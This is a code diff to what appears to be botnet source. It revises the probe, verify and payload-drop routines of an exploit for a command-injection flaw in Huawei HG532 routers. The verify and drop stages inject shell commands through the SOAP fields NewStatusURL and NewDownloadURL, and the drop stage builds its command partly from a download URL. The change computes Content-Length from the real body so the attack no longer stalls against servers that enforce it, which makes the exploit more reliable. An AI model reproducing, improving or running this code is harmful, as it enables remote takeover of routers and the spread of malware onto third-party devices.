@@ -2082,20 +2082,25 @@ static int cve_tbk_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
 
 static int cve_hg532_probe(const char *ip, uint16_t port, char *banner, size_t banner_len) {
     /* The vulnerable TR-064 service answers a benign SOAP request with
-     * the "HUAWEIUPNP" marker. No shell metacharacters are sent here. */
-    char req[1024];
-    snprintf(req, sizeof(req),
-        "POST /ctrlt/DeviceUpgrade_1 HTTP/1.0\r\n"
-        "Host: %s:%d\r\nContent-Type: text/xml\r\n"
-        "SOAPAction: urn:schemas-upnp-org:service:WANPPPConnection:1#DeviceUpgrade\r\n"
-        "Content-Length: 480\r\n\r\n"
+     * the "HUAWEIUPNP" marker. No shell metacharacters are sent here.
+     * Content-Length is computed from the real body length (the old
+     * hardcoded 480 exceeded the 372-byte body, so any CL-respecting
+     * server blocked waiting for bytes that never arrived). */
+    char body[512];
+    snprintf(body, sizeof(body),
         "<?xml version=\"1.0\" ?>\n"
         "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n"
         "<s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n"
         "<NewStatusURL>http://127.0.0.1/status</NewStatusURL>\n"
         "<NewDownloadURL>http://127.0.0.1/download</NewDownloadURL>\n"
-        "</u:Upgrade></s:Body></s:Envelope>",
-        ip, port);
+        "</u:Upgrade></s:Body></s:Envelope>");
+    char req[1024];
+    snprintf(req, sizeof(req),
+        "POST /ctrlt/DeviceUpgrade_1 HTTP/1.0\r\n"
+        "Host: %s:%d\r\nContent-Type: text/xml\r\n"
+        "SOAPAction: urn:schemas-upnp-org:service:WANPPPConnection:1#DeviceUpgrade\r\n"
+        "Content-Length: %zu\r\n\r\n%s",
+        ip, port, strlen(body), body);
     char resp[1024];
     int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
     if (n <= 0) return 0;
@@ -2111,19 +2116,22 @@ static int cve_hg532_verify(const char *ip, uint16_t port) {
      * processed the injection. Payload drop is refused otherwise. */
     char token[32];
     snprintf(token, sizeof(token), "NOTNET%08x", random_uint32());
-    char req[1536];
-    snprintf(req, sizeof(req),
-        "POST /ctrlt/DeviceUpgrade_1 HTTP/1.0\r\n"
-        "Host: %s:%d\r\nContent-Type: text/xml\r\n"
-        "SOAPAction: urn:schemas-upnp-org:service:WANPPPConnection:1#DeviceUpgrade\r\n"
-        "Content-Length: 500\r\n\r\n"
+    char body[512];
+    snprintf(body, sizeof(body),
         "<?xml version=\"1.0\" ?>\n"
         "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n"
         "<s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n"
         "<NewStatusURL>;echo %s;</NewStatusURL>\n"
         "<NewDownloadURL>;echo %s;</NewDownloadURL>\n"
         "</u:Upgrade></s:Body></s:Envelope>",
-        ip, port, token, token);
+        token, token);
+    char req[1536];
+    snprintf(req, sizeof(req),
+        "POST /ctrlt/DeviceUpgrade_1 HTTP/1.0\r\n"
+        "Host: %s:%d\r\nContent-Type: text/xml\r\n"
+        "SOAPAction: urn:schemas-upnp-org:service:WANPPPConnection:1#DeviceUpgrade\r\n"
+        "Content-Length: %zu\r\n\r\n%s",
+        ip, port, strlen(body), body);
     char resp[2048];
     int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
     if (n <= 0) return 0;
@@ -2140,19 +2148,22 @@ static int cve_hg532_drop(notnet_bot_t *bot, const char *ip, uint16_t port) {
              dl_url);
     /* The command carries no '&' or '<'/'>', so no XML escaping and no
      * parameter splitting is needed; ';' separates the shell steps. */
-    char req[2048];
-    snprintf(req, sizeof(req),
-        "POST /ctrlt/DeviceUpgrade_1 HTTP/1.0\r\n"
-        "Host: %s:%d\r\nContent-Type: text/xml\r\n"
-        "SOAPAction: urn:schemas-upnp-org:service:WANPPPConnection:1#DeviceUpgrade\r\n"
-        "Content-Length: 600\r\n\r\n"
+    char body[1536];
+    snprintf(body, sizeof(body),
         "<?xml version=\"1.0\" ?>\n"
         "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n"
         "<s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n"
         "<NewStatusURL>;%.500s;</NewStatusURL>\n"
         "<NewDownloadURL>;%.500s;</NewDownloadURL>\n"
         "</u:Upgrade></s:Body></s:Envelope>",
-        ip, port, cmd, cmd);
+        cmd, cmd);
+    char req[2048];
+    snprintf(req, sizeof(req),
+        "POST /ctrlt/DeviceUpgrade_1 HTTP/1.0\r\n"
+        "Host: %s:%d\r\nContent-Type: text/xml\r\n"
+        "SOAPAction: urn:schemas-upnp-org:service:WANPPPConnection:1#DeviceUpgrade\r\n"
+        "Content-Length: %zu\r\n\r\n%s",
+        ip, port, strlen(body), body);
     char resp[1024];
     int n = cve_http_exchange(ip, port, req, resp, sizeof(resp));
     if (n <= 0) {
